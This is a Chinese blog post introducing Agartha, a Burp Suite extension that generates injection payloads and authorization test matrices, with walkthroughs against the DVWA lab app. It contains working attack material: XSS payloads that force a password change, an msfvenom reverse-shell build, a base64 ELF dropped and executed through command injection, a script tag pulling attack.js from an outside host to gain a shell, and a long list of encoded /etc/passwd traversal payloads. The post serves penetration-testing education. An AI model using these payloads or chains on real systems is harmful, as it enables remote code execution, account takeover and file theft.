# [Agartha LFI|RCE|授权|SQL注入等payloads生成器](https://www.ddosi.org/agartha/)

2023-04-11本文共 64078 字阅读完需 255 分钟

> Agartha LFI|RCE|Auth|SQL注入等payloads生成器,Agartha 是一种渗透测试工具(BurpSuite 插件)，可创建动态负载列表和用户访问矩阵以揭示注入缺陷和身份验证/授权问题。 Agartha 创建了运行时、系统和供应商中立的有效载荷

![img](C:\Users\m\Desktop\agartha\7-1-750x450.webp)

目录导航



## Agartha简介

Agartha 是一种渗透测试工具(BurpSuite 插件)，可创建动态负载列表和用户访问矩阵以揭示注入缺陷和身份验证/授权问题。已经存在许多不同的攻击有效载荷，但 Agartha 创建了运行时、系统和供应商中立的有效载荷，**具有许多不同的可能性和绕过方法**。它还提醒注意用户会话和 URL 关系，这使得查找用户访问绕过变得容易。**此外，它将 Http 请求转换为 JavaScript，以帮助更多地挖掘 XSS 问题。**

[![Agartha LFI|RCE|Auth|SQL注入等payloads生成器](C:\Users\m\Desktop\agartha\07164804.webp)](https://www.ddosi.org/wp-content/uploads/2023/04/07164804.webp)

## Agartha特色

- **有效载荷生成器**：它为不同的攻击类型创建有效载荷/字典列表。
- **本地文件包含，目录遍历**：它创建具有各种编码和转义字符的文件字典列表。
- **命令注入/远程代码执行**：它为具有不同组合的 unix 和 windows 环境创建命令字典列表。
- **SQL 注入**：它为各种数据库创建堆叠查询、基于布尔值、基于联合、基于时间和基于顺序的 SQL 注入词表，以帮助找到漏洞点。
- **授权矩阵**：它根据用户会话和 URL 列表创建访问角色矩阵，以确定与授权/身份验证相关的访问绕过问题。
- **Http 请求到 JavaScript 转换器**：它将 Http 请求转换为 JavaScript 代码，以用于进一步的 XSS 利用等。

## 使用方法

### 安装

您应该先下载“jython”文件并设置您的环境：

- Burp Menu > Extender > Options > Python Environment > Locate jython standalone jar file

进而：

- Burp Menu > Extender > Extensions > Add > Extension Type: Python > Extension file(.py): 选择 ‘agartha.py’ 文件

毕竟，您会在主窗口中看到“Agartha”选项卡，它也会被右键单击注册，位于：

- ‘Extensions > Agartha {LFI|RCE|Auth|SQL Injection|Http->Js}’，有两个选项
  - ‘Agartha Panel’
  - ‘Copy as JavaScript’

### 测试于

- Jython 版本 v2.7.3
- Busrpsuite v2023.3.2

# 使用示例

## 本地文件包含目录遍历

**它同时支持 unix 和 windows 文件系统。**您可以为您想要的路径动态生成任何单词列表。您只需要提供一个文件路径就可以了。

**“深度”**表示单词列表应该有多深。您可以生成“直到”或“等于”该值的词表。

**“Waf Bypass”**询问您是否要包括所有绕过功能；如空字节、不同的编码等。

[![Agartha LFI|RCE|Auth|SQL注入等payloads生成器](https://www.ddosi.org/wp-content/uploads/2023/04/1.gif)](https://www.ddosi.org/wp-content/uploads/2023/04/1.gif)

## 命令注入/远程代码执行

它使用您提供的命令创建命令执行动态词表。它将适用于 unix 和 windows 环境的不同分隔符和终止符组合在一起。

**“URL 编码”**对字典输出进行编码。

[![Agartha LFI|RCE|Auth|SQL注入等payloads生成器](C:\Users\m\Desktop\agartha\2.gif)](https://www.ddosi.org/wp-content/uploads/2023/04/2.gif)

## SQL注入

它为堆叠查询、基于布尔值、基于联合、基于时间、基于顺序的 SQL 注入攻击生成有效负载，您无需提供任何输入。你只需选择你想要的 SQL 攻击类型和数据库，然后它就会生成一个包含不同组合的词表。

**“URL 编码”**对字典输出进行编码。

**“Waf Bypass”**询问您是否要包括所有绕过功能；如空字节、不同的编码等。

**‘Union-Based’**和**‘Order-Based’**询问有效载荷应该有多深。**默认值为 5。**

其余与数据库和攻击类型有关。

[![Agartha LFI|RCE|Auth|SQL注入等payloads生成器](C:\Users\m\Desktop\agartha\3.gif)](https://www.ddosi.org/wp-content/uploads/2023/04/3.gif)

## 授权矩阵

这部分重点关注用户会话和 URL 关系以确定未授权访问。该工具将访问来自预定义用户会话的所有 URL，并用所有 Http 响应填充表格。它是一种访问矩阵，有助于找出身份验证/授权问题。之后我们将看到哪些用户可以访问哪些页面内容。

- **用户会话名称**：您可以右键单击任何请求并从“扩展 > Agartha > Agartha 面板”发送它以定义用户会话。
- **用户可以访问的URL 地址**：您可以使用 Burp 的蜘蛛功能或任何站点地图生成器。您可能需要为不同的用户提供不同的 URL。
- 提供会话名称、Http 标头和允许的 URL 后，您可以使用“添加用户”按钮添加它。

向 Agartha 发送 Http 请求后，面板将填写工具中的一些字段。

[![Agartha LFI|RCE|Auth|SQL注入等payloads生成器](C:\Users\m\Desktop\agartha\4.gif)](https://www.ddosi.org/wp-content/uploads/2023/04/4.gif)



1. 您提供的会话的用户名是什么。

   您最多可以添加 4 个不同的用户

   ，每个用户将有不同的颜色以使其更具可读性。

   - “添加用户”用于添加用户会话
   - 您可以在“GET”和 POST 之间更改 HTTP 请求方法。
   - “重置”按钮清除所有表格和字段内容。
   - “运行”按钮执行任务。
   - “警告”以不同颜色表示可能出现的问题。

2. 用户的请求头和所有与用户相关的 URL 访问都将基于它。

3. 用户可以访问的 URL 地址。您可以使用手动或自动工具（如蜘蛛、站点地图生成器等）创建此列表，并且不要忘记删除注销链接。

4. 您提供的所有 URL 都将在这里。如果 URL 属于她/他，用户单元格也将被着色。

5. 未经身份验证的 Http 请求和响应。所有会话 cookie、令牌和参数都将从 Http 调用中删除。

6. 使用您在第一步中定义的用户会话进行 Http 请求和响应。单元格标题显示 Http 响应代码和响应长度。

7. 只需单击您要检查的单元格，Http 详细信息就会显示在此处。

[![Agartha LFI|RCE|Auth|SQL注入等payloads生成器](C:\Users\m\Desktop\agartha\5-1-scaled.webp)](https://www.ddosi.org/wp-content/uploads/2023/04/5-1-scaled.webp)

单击“运行”后，该工具将用不同颜色填充用户和 URL 矩阵。除了用户颜色，您还会看到橙色、黄色和红色的单元格。URL 地址不属于用户，单元格颜色为：

- 黄色，因为响应返回带有身份验证/授权问题的“HTTP 302”
- 橙色，因为响应返回“HTTP 200”但内容长度不同，涉及身份验证/授权问题
- 红色，因为响应返回“HTTP 200”和相同的内容长度，涉及身份验证/授权问题

您可能还会注意到，它只支持同时使用一种 Http 请求方法和用户会话，因为它处理批量请求并且不可能为每个调用提供不同的标头选项。但是您可以使用“GET/POST”方法来查看响应差异。

## Http 请求到 JavaScript 转换器

**该功能用于将 Http 请求转换为 JavaScript 代码。进一步挖掘 XSS 问题和绕过标头限制可能很有用。**

要访问它，请右键单击任何 Http 请求和“扩展 > Agartha > 复制为 JavaScript”。

[![Agartha LFI|RCE|Auth|SQL注入等payloads生成器](C:\Users\m\Desktop\agartha\6-1.webp)](https://www.ddosi.org/wp-content/uploads/2023/04/6-1.webp)

它会自动将其保存到您的剪贴板，并附上一些备注。例如：

```javascript
HTTP request with minimum header paramaters in JavaScript:
	<script>var xhr=new XMLHttpRequest();xhr.open('POST','http://vm/login.php');xhr.withCredentials=true;xhr.setRequestHeader('Content-type','application/x-www-form-urlencoded');xhr.send('username=admin&password=password&Login=Login');</script>

Http request with all header paramaters (except cookies, tokens, etc) in JavaScript, you may need to remove unnecessary fields:
	<script>var xhr=new XMLHttpRequest();xhr.open('POST','http://vm/login.php');xhr.withCredentials=true;xhr.setRequestHeader('Host',' vm');xhr.setRequestHeader('User-Agent',' Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:97.0) Gecko/20100101 Firefox/97.0');xhr.setRequestHeader('Accept',' */*');xhr.setRequestHeader('Accept-Language',' en-US,en;q=0.5');xhr.setRequestHeader('Accept-Encoding',' gzip, deflate');xhr.setRequestHeader('Content-type',' application/x-www-form-urlencoded');xhr.setRequestHeader('Content-Length',' 44');xhr.setRequestHeader('Origin',' http://vm');xhr.setRequestHeader('Connection',' close');xhr.setRequestHeader('Referer',' http://vm/login.php');xhr.send('username=admin&password=password&Login=Login');</script>

For redirection, please also add this code before '</script>' tag:
	xhr.onreadystatechange=function(){if (this.status===302){var location=this.getResponseHeader('Location');return ajax.call(this,location);}};
```

请注意，JavaScript 代码将在原始用户会话中被调用，许多标头字段将由浏览器自动填充。在某些情况下，服务器可能要求一些头字段是强制性的，因此**您可能需要修改代码进行调整。**

# Agartha使用案例

让我们看看它的实际效果。

我们的目标易受攻击的应用程序将是 DVWA。

### 有效载荷生成器 > LFI/DT

文件包含或目录遍历攻击旨在从目标应用程序中检索操作系统内容，该功能为所需路径创建动态字典列表。

我们需要 3 个参数：

1. 文件路径
2. 我们的有效载荷应该去多少个上层文件夹
3. 以及是否包含WAF绕过

[![Agartha LFI|RCE|Auth|SQL注入等payloads生成器](C:\Users\m\Desktop\agartha\11.webp)](https://www.ddosi.org/wp-content/uploads/2023/04/11.webp)

生成有效负载列表后，我们可以使用 Burp 的 Intruder。

通常，应该禁用“有效负载编码”，因为单词列表已经用不同的变体编码了。

“页面”参数将是我们的目标。

```http
GET http://vm/vulnerabilities/fi/?page=§§ HTTP/1.1
Host: vm
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:106.0) Gecko/20100101 Firefox/106.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-GB,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Referer: http://vm/vulnerabilities/fi/?page=include.php
Cookie: PHPSESSID=kg90l0jdd1f8learivmhpcpnt3; security=medium
Upgrade-Insecure-Requests: 1
```

‘/etc/group’ 文件是一个众所周知的文件，因此我们可以从输出中 grep 一个关键字（例如 ‘root:’）以简化我们的分析：’Intruder > Options > Grep – Match’

[![Agartha LFI|RCE|Auth|SQL注入等payloads生成器](C:\Users\m\Desktop\agartha\10.webp)](https://www.ddosi.org/wp-content/uploads/2023/04/10.webp)

如图所示，我们可以使用不同的负载组合成功检索“/etc/group”文件的内容。

### 有效载荷生成器 > 命令注入 / RCE

下一个有效负载生成器功能是关于命令注入的。它的目的是在目标系统中找到可能的代码执行。用户需要提供一个操作系统命令，该工具将生成一个列表，该列表适用于 Windows 和 Unix 系统。

例如，让我们尝试为“cat /etc/group”命令生成有效负载并启用 URL 编码：

[![Agartha LFI|RCE|Auth|SQL注入等payloads生成器](C:\Users\m\Desktop\agartha\9.webp)](https://www.ddosi.org/wp-content/uploads/2023/04/9.webp)



‘ip’ 参数将是我们的目标：

```http
POST http://vm/vulnerabilities/exec/ HTTP/1.1
Host: vm
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:107.0) Gecko/20100101 Firefox/107.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-GB,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 24
Origin: http://vm
Connection: close
Referer: http://vm/vulnerabilities/exec/
Cookie: PHPSESSID=dhnb21v04g0kldim1istcpedt3; security=high
Upgrade-Insecure-Requests: 1

ip=localhost§§&Submit=Submit
```

我们将再次使用 Burp 的入侵者来执行我们的攻击。

**我们应该禁用负载编码，因为我们已经对负载列表进行了编码。**

[![Agartha LFI|RCE|Auth|SQL注入等payloads生成器](C:\Users\m\Desktop\agartha\8.webp)](https://www.ddosi.org/wp-content/uploads/2023/04/8.webp)

如图所示，我们可以在目标系统中成功执行所需的命令，并检索具有不同负载组合的“/etc/group”文件的内容。

### 有效载荷生成器 > SQLi

最后一个负载生成选项用于 SQL 注入。它为各种数据库系统创建不同类型的注入攻击。

让我们用 URL 编码创建一个基于布尔的 SQL 注入负载：

[![Agartha LFI|RCE|Auth|SQL注入等payloads生成器](C:\Users\m\Desktop\agartha\1666793275925.webp)](https://www.ddosi.org/wp-content/uploads/2023/04/1666793275925.webp)

“id”参数将是我们的目标：



```http
POST http://vm/vulnerabilities/sqli/ HTTP/1.1
Host: vm
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:107.0) Gecko/20100101 Firefox/107.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-GB,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 18
Origin: http://vm
Connection: close
Referer: http://vm/vulnerabilities/sqli/
Cookie: PHPSESSID=dhnb21v04g0kldim1istcpedt3; security=medium
Upgrade-Insecure-Requests: 1

id=§§&Submit=Submit
```

我们将再次使用 Burp 的入侵者来执行我们的攻击。 

**我们应该禁用负载编码，因为我们已经对负载列表进行了编码。**

我们仍然可以 grep Intruder 的结果表，但我们应该知道一些有效的用户名，或者我们可以注意响应长度。让我们来看看后者。

[![Agartha LFI|RCE|Auth|SQL注入等payloads生成器](C:\Users\m\Desktop\agartha\1666793851451.webp)](https://www.ddosi.org/wp-content/uploads/2023/04/1666793851451.webp)

结果表显示，不同的 payload 组合返回相同的结果，我们使用基于布尔的 SQL 注入成功检索了所有用户。

### Http Request to JavaScript Converter – 1: XSS + CSRF

将 Http 转换为 JavaScript 使我们有机会通过 XXS 问题调用 Http 请求，这意味着只需单击一下，我们就可以让受害者调用其他功能。

假设目标应用程序同时存在 XSS + CSRF 问题：

- 反射型XSS 漏洞：/vulnerabilities/xss_r/
- 带密码更改页面的 CSRF：/vulnerabilities/csrf/

因此，我们将创建一个 JavaScript 代码来执行密码更改功能，并通过 XSS 问题调用此代码。

这是一个常规的密码更改请求

```http
GET http://vm/vulnerabilities/csrf/?password_new=password1&password_conf=password1&Change=Change HTTP/1.1
Host: vm
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:107.0) Gecko/20100101 Firefox/107.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-GB,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Referer: http://vm/vulnerabilities/csrf/
Cookie: PHPSESSID=8qdbvrqrj753qe6qgatukb3g81; security=low
Upgrade-Insecure-Requests: 1
```

我们需要根据这个请求创建我们的 JavaScript 代码。

[![Agartha LFI|RCE|Auth|SQL注入等payloads生成器](C:\Users\m\Desktop\agartha\1667120937743.webp)](https://www.ddosi.org/wp-content/uploads/2023/04/1667120937743.webp)

该代码将保存到您的剪贴板。

```javascript
1) Http request with minimum header paramaters in JavaScript
	<script>var xhr=new XMLHttpRequest();xhr.open('GET','http://vm/vulnerabilities/csrf/?password_new=password1&password_conf=password1&Change=Change');xhr.withCredentials=true;xhr.send();</script>

2) Http request with all header paramaters (except cookies, tokens, etc) in JavaScript, you may need to remove unnecessary fields:
	<script>var xhr=new XMLHttpRequest();xhr.open('GET','http://vm/vulnerabilities/csrf/?password_new=password1&password_conf=password1&Change=Change');xhr.withCredentials=true;xhr.setRequestHeader('Host',' vm');xhr.setRequestHeader('User-Agent',' Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:107.0) Gecko/20100101 Firefox/107.0');xhr.setRequestHeader('Accept',' text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8');xhr.setRequestHeader('Accept-Language',' en-GB,en;q=0.5');xhr.setRequestHeader('Accept-Encoding',' gzip, deflate');xhr.setRequestHeader('Connection',' close');xhr.setRequestHeader('Referer',' http://vm/vulnerabilities/csrf/');xhr.setRequestHeader('Upgrade-Insecure-Requests',' 1');xhr.send();</script>

3) For redirection, please also add this code before '</script>' tag:
	xhr.onreadystatechange=function(){if (this.status===302){var location=this.getResponseHeader('Location');return ajax.call(this,location);}};
```

您将看到 3 个不同的选项：

1. 第一个是最简单和最小的请求。
2. 第二个包括所有的头字段，因为有些页面可能要求一些头字段是强制性的。例如，“Content-Type”可能是服务器处理请求的标准。您可以将此处作为参考，并找出您的最小 JavaScript 代码所需的字段。
3. 第三个是启用重定向。如果您想遵循“HTTP 302”响应，则应在“</script>”标记之前添加此代码。

对于我们的案例，第一个选项就可以了，我们将使用此代码来更改用户密码：

```xml
<script>var xhr=new XMLHttpRequest();xhr.open('GET','http://vm/vulnerabilities/csrf/?password_new=password1&password_conf=password1&Change=Change');xhr.withCredentials=true;xhr.send();</script>
```

我们将提供此 JS 作为 XSS（反射）问题的输入：

[![Agartha LFI|RCE|Auth|SQL注入等payloads生成器](C:\Users\m\Desktop\agartha\1667122236257.webp)](https://www.ddosi.org/wp-content/uploads/2023/04/1667122236257.webp)



当我们提交请求时，会发生两次不同的 Http 调用。该页面将执行我们的 JavaScript 负载，它调用另一个 Http 函数来更改用户密码。

用户提交请求：

```apache
GET http://vm/vulnerabilities/xss_r/?name=%3Cscript%3Evar+xhr%3Dnew+XMLHttpRequest%28%29%3Bxhr.open%28%27GET%27%2C%27http%3A%2F%2Fvm%2Fvulnerabilities%2Fcsrf%2F%3Fpassword_new%3Dpassword1%26password_conf%3Dpassword1%26Change%3DChange%27%29%3Bxhr.withCredentials%3Dtrue%3Bxhr.send%28%29%3B%3C%2Fscript%3E HTTP/1.1
Host: vm
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:107.0) Gecko/20100101 Firefox/107.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-GB,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Referer: http://vm/vulnerabilities/xss_r/
Cookie: PHPSESSID=8qdbvrqrj753qe6qgatukb3g81; security=low
Upgrade-Insecure-Requests: 1
```

另一个请求从 JavaScript 代码自动执行：

```http
GET http://vm/vulnerabilities/csrf/?password_new=password1&password_conf=password1&Change=Change HTTP/1.1
Host: vm
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:107.0) Gecko/20100101 Firefox/107.0
Accept: */*
Accept-Language: en-GB,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Cookie: PHPSESSID=8qdbvrqrj753qe6qgatukb3g81; security=low
```

它表明，我们利用了 XSS 问题并执行了另一个代码。**只需单击即可更改用户密码：**

```xquery
http://vm/vulnerabilities/xss_r/?name=%3Cscript%3Evar+xhr%3Dnew+XMLHttpRequest%28%29%3Bxhr.open%28%27GET%27%2C%27http%3A%2F%2Fvm%2Fvulnerabilities%2Fcsrf%2F%3Fpassword_new%3Dpassword1%26password_conf%3Dpassword1%26Change%3DChange%27%29%3Bxhr.withCredentials%3Dtrue%3Bxhr.send%28%29%3B%3C%2Fscript%3E
```

### Http Request to JavaScript Converter – 2: XSS + RCE

我想在这里再举一个例子来展示这个功能有多强大，现在我们将把 XSS + RCE 问题结合起来。

- 反映的 XSS 问题：/vulnerabilities/xss_r/
- 命令注入：/vulnerabilities/exec/

首先，我们将使用 msfvenom 创建我们的恶意后门文件：

```routeros
$ msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.0.19 LPORT=8008 -f elf > shell.elf
```

然后我们将其转换为 base64 编码以便于复制和粘贴：

```gcode
$ base64 -w0 shell.elf
f0VMRgEBAQAAAAAAAAAAAAAIAAwABAAAAVIAECDQAAAAAAAAAAAAADQAIAABAAAAAAAAEAAAAAAAAAAAAACACABAiYAAAA3AAAAAcAAAAAAAAAMdv341NDU2oCieGwZs2Ak1mwP82ASXn5aMCoABNoAgAfSinhsGZQUVOzA4nhzYBSavUznj2 
```

现在，我们的恶意负载将处于 3 个不同的阶段：

```shell
$ echo 'f0VMRgEBAQAAAAAAAAAAAAIAAwABAAAAVIAECDQAAAAAAAAAAAAAADQAIAABAAAAAAAAAAEAAAAAAAAAAIAECACABAiYAAAA3AAAAAcAAAAAEAAAMdv341NDU2oCieGwZs2Ak1mwP82ASXn5aMCoABNoAgAfSInhsGZQUVOzA4nhzYBSaG4vc2hoLy9iaYnjUlOJ4bALzYA=' | base64 -d >/tmp/shell.elf;chmod 777 /tmp/shell.elf;/tmp/shell.elf
```

从之前的 Agartha 功能中，我们找到了一个有效的命令注入有效载荷：

```http
POST http://vm/vulnerabilities/exec/ HTTP/1.1
Host: vm
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:107.0) Gecko/20100101 Firefox/107.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-GB,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 26
Origin: http://vm
Connection: close
Referer: http://vm/vulnerabilities/exec/
Cookie: PHPSESSID=8qdbvrqrj753qe6qgatukb3g81; security=low
Upgrade-Insecure-Requests: 1

ip=localhost%3B%60echo+%27f0VMRgEBAQAAAAAAAAAAAAIAAwABAAAAVIAECDQAAAAAAAAAAAAAADQAIAABAAAAAAAAAAEAAAAAAAAAAIAECACABAiYAAAA3AAAAAcAAAAAEAAAMdv341NDU2oCieGwZs2Ak1mwP82ASXn5aMCoABNoAgAfSInhsGZQUVOzA4nhzYBSaG4vc2hoLy9iaYnjUlOJ4bALzYA%3D%27+%7C+base64+-d+%3E%2Ftmp%2Fshell.elf%60%3B%60chmod+777+%2Ftmp%2Fshell.elf%60%3B%60%2Ftmp%2Fshell.elf%60&Submit=Submit
```

‘ *id* ‘参数应该是：

```awk
localhost;`echo 'f0VMRgEBAQAAAAAAAAAAAAIAAwABAAAAVIAECDQAAAAAAAAAAAAAADQAIAABAAAAAAAAAAEAAAAAAAAAAIAECACABAiYAAAA3AAAAAcAAAAAEAAAMdv341NDU2oCieGwZs2Ak1mwP82ASXn5aMCoABNoAgAfSInhsGZQUVOzA4nhzYBSaG4vc2hoLy9iaYnjUlOJ4bALzYA=' | base64 -d >/tmp/shell.elf`;`chmod 777 /tmp/shell.elf`;`/tmp/shell.elf`
```

我们需要将此 Http 请求转换为 JavaScript，然后再次右键单击“Extensions > Agartha > Copy as JavaScript”将代码保存到我们的剪贴板，第一个选项适用于我们的情况（请求具有最小参数）。

[![Agartha LFI|RCE|Auth|SQL注入等payloads生成器](C:\Users\m\Desktop\agartha\1-3.webp)](https://www.ddosi.org/wp-content/uploads/2023/04/1-3.webp)

然后我们用这个内容创建一个 JavaScript 文件并将它托管在我们的本地机器上：

[![Agartha LFI|RCE|Auth|SQL注入等payloads生成器](C:\Users\m\Desktop\agartha\2-3.webp)](https://www.ddosi.org/wp-content/uploads/2023/04/2-3.webp)

此 JavaScript 代码将通过“命令注入”漏洞执行，并将由 XSS 问题触发。

一个简单的 Web 服务工作正常，JS 文件路径为：

```xml
<script src=http://192.168.0.19:8002/attack.js></script>
```

网址将是：

```apache
http://vm/vulnerabilities/xss_r/?name=%3Cscript+src%3Dhttp%3A%2F%2F192.168.0.19%3A8002%2Fattack.js%3E%3C%2Fscript%3E
```

[![Agartha LFI|RCE|Auth|SQL注入等payloads生成器](C:\Users\m\Desktop\agartha\3-5.webp)](https://www.ddosi.org/wp-content/uploads/2023/04/3-5.webp)

在点击“提交”按钮后，我们成功获得了一个反向shell。

[![Agartha LFI|RCE|Auth|SQL注入等payloads生成器](C:\Users\m\Desktop\agartha\4.webp)](https://www.ddosi.org/wp-content/uploads/2023/04/4.webp)

只需单击一个 URL，我们就会通过 XSS 问题远程执行代码。我们在 JavaScript 代码中调用了另一个 Http 请求。

在进入下一个特性之前，我想强调的是，编码可能是嵌套调用的一个问题，这就是为什么我更喜欢从外部加载 JavaScript 文件以避免所有可能的编码问题。

**注意：**它还不支持’XML/JSON’ post 数据。

### 授权矩阵

它旨在检查身份验证/授权问题，结果取决于两个重要因素：

- 用户会话
- 用户可以访问的URL列表

[![Agartha LFI|RCE|Auth|SQL注入等payloads生成器](C:\Users\m\Desktop\agartha\5-2.webp)](https://www.ddosi.org/wp-content/uploads/2023/04/5-2.webp)



要将用户标头发送到 Agartha，我们只需右键单击任何用户会话并选择“扩展 > Agartha > Agartha 面板”。

[![Agartha LFI|RCE|Auth|SQL注入等payloads生成器](C:\Users\m\Desktop\agartha\6-2.webp)](https://www.ddosi.org/wp-content/uploads/2023/04/6-2.webp)

标头字段会自动填充，但对于用户可以访问的 URL 列表应由我们提供。有几种方法可以做到这一点。Burp 的蜘蛛或一些浏览器附加组件可用于提取哪些 URL 在用户的地盘上。

**注意：请确保已排除注销链接。**

我们也将为其他 2 个用户做同样的事情，然后运行它。

[![Agartha LFI|RCE|Auth|SQL注入等payloads生成器](https://www.ddosi.org/wp-content/uploads/2023/04/7-1.webp)](https://www.ddosi.org/wp-content/uploads/2023/04/7-1.webp)

单击“运行”按钮后，我们的矩阵已填充，所有 URL 都根据用户会话进行了访问。

单元格标头显示 Http 响应代码和响应大小。即使在底部，您也可以访问所有 Http 详细信息并分析用户如何查看页面。

**注意：**如果目标 URL 需要自定义“POST”数据，该功能可能无法正常工作。



就这些:)，感谢您的阅读，我希望您喜欢它。

[from](https://www.linkedin.com/pulse/agartha-lfi-rce-auth-sqli-http-js-volkan-dindar)

## 测试

### 文件读取

例如生成文件读取的payload(读取/etc/passwd)

[![Agartha LFI|RCE|Auth|SQL注入等payloads生成器](C:\Users\m\Desktop\agartha\11162038.webp)](https://www.ddosi.org/wp-content/uploads/2023/04/11162038.webp)

```llvm
etc\passwd
etc\\passwd
etc\\\passwd
etc\/passwd
etc0x5cpasswd
etc0x2fpasswd
etc/passwd;index.html
etc/passwd%FFindex.html
etc/passwd%FF.jpg
etc/passwd%FF
etc/passwd%20index.html
etc/passwd%20.jpg
etc/passwd%20
etc/passwd%0Dindex.html
etc/passwd%0D.jpg
etc/passwd%0D
etc/passwd%09index.html
etc/passwd%09.jpg
etc/passwd%09
etc/passwd%00index.html
etc/passwd%00.jpg
etc/passwd%00
etc/passwd
etc//passwd
etc///passwd
etc%uF025passwd
etc%uEFC8passwd
etc%u2216passwd
etc%u2215passwd
etc%e0%80%afpasswd
etc%c1%9cpasswd
etc%c0%afpasswd
etc%c0%80%5cpasswd
etc%c0%5cpasswd
etc%c0%2fpasswd
etc%5cpasswd
etc%2fpasswd
etc%25c1%259cpasswd
etc%25c0%25afpasswd
etc%255cpasswd
etc%252fpasswd
etc%%35%63passwd
etc%%32%66passwd
\etc/passwd
\../etc/passwd
\../../etc/passwd
\../../../etc/passwd
\../../../../etc/passwd
\../../../../../etc/passwd
0x2e0x2e0x5cetc0x5cpasswd
0x2e0x2e0x5cetc/passwd
0x2e0x2e0x5c0x2e0x2e0x5cetc0x5cpasswd
0x2e0x2e0x5c0x2e0x2e0x5cetc/passwd
0x2e0x2e0x5c0x2e0x2e0x5c0x2e0x2e0x5cetc0x5cpasswd
0x2e0x2e0x5c0x2e0x2e0x5c0x2e0x2e0x5cetc/passwd
0x2e0x2e0x5c0x2e0x2e0x5c0x2e0x2e0x5c0x2e0x2e0x5cetc0x5cpasswd
0x2e0x2e0x5c0x2e0x2e0x5c0x2e0x2e0x5c0x2e0x2e0x5cetc/passwd
0x2e0x2e0x5c0x2e0x2e0x5c0x2e0x2e0x5c0x2e0x2e0x5c0x2e0x2e0x5cetc0x5cpasswd
0x2e0x2e0x5c0x2e0x2e0x5c0x2e0x2e0x5c0x2e0x2e0x5c0x2e0x2e0x5cetc/passwd
0x2e0x2e0x5c0x2e0x2e0x5c0x2e0x2e0x5c0x2e0x2e0x5c0x2e0x2e/etc/passwd
0x2e0x2e0x5c0x2e0x2e0x5c0x2e0x2e0x5c0x2e0x2e/etc/passwd
0x2e0x2e0x5c0x2e0x2e0x5c0x2e0x2e/etc/passwd
0x2e0x2e0x5c0x2e0x2e/etc/passwd
0x2e0x2e0x2fetc0x2fpasswd
0x2e0x2e0x2fetc/passwd
0x2e0x2e0x2f0x2e0x2e0x2fetc0x2fpasswd
0x2e0x2e0x2f0x2e0x2e0x2fetc/passwd
0x2e0x2e0x2f0x2e0x2e0x2f0x2e0x2e0x2fetc0x2fpasswd
0x2e0x2e0x2f0x2e0x2e0x2f0x2e0x2e0x2fetc/passwd
0x2e0x2e0x2f0x2e0x2e0x2f0x2e0x2e0x2f0x2e0x2e0x2fetc0x2fpasswd
0x2e0x2e0x2f0x2e0x2e0x2f0x2e0x2e0x2f0x2e0x2e0x2fetc/passwd
0x2e0x2e0x2f0x2e0x2e0x2f0x2e0x2e0x2f0x2e0x2e0x2f0x2e0x2e0x2fetc0x2fpasswd
0x2e0x2e0x2f0x2e0x2e0x2f0x2e0x2e0x2f0x2e0x2e0x2f0x2e0x2e0x2fetc/passwd
0x2e0x2e0x2f0x2e0x2e0x2f0x2e0x2e0x2f0x2e0x2e0x2f0x2e0x2e/etc/passwd
0x2e0x2e0x2f0x2e0x2e0x2f0x2e0x2e0x2f0x2e0x2e/etc/passwd
0x2e0x2e0x2f0x2e0x2e0x2f0x2e0x2e/etc/passwd
0x2e0x2e0x2f0x2e0x2e/etc/passwd
0x2e0x2e/etc/passwd
0x2e0x2e/0x2e0x2e/etc/passwd
0x2e0x2e/0x2e0x2e/0x2e0x2e/etc/passwd
0x2e0x2e/0x2e0x2e/0x2e0x2e/0x2e0x2e/etc/passwd
0x2e0x2e/0x2e0x2e/0x2e0x2e/0x2e0x2e/0x2e0x2e/etc/passwd
/etc/passwd
/..;/etc/passwd
/..;/../etc/passwd
/..;/../../etc/passwd
/..;/../../../etc/passwd
/..;/../../../../etc/passwd
/..;/../../../../../etc/passwd
/../etc/passwd
/../../etc/passwd
/../../../etc/passwd
/../../../../etc/passwd
/../../../../../etc/passwd
..\etc\passwd
..\etc/passwd
..\\etc\\passwd
..\\etc/passwd
..\\\etc\\\passwd
..\\\etc/passwd
..\\\..\\\etc\\\passwd
..\\\..\\\etc/passwd
..\\\..\\\..\\\etc\\\passwd
..\\\..\\\..\\\etc/passwd
..\\\..\\\..\\\..\\\etc\\\passwd
..\\\..\\\..\\\..\\\etc/passwd
..\\\..\\\..\\\..\\\..\\\etc\\\passwd
..\\\..\\\..\\\..\\\..\\\etc/passwd
..\\\..\\\..\\\..\\\../etc/passwd
..\\\..\\\..\\\../etc/passwd
..\\\..\\\../etc/passwd
..\\\../etc/passwd
..\\..\\etc\\passwd
..\\..\\etc/passwd
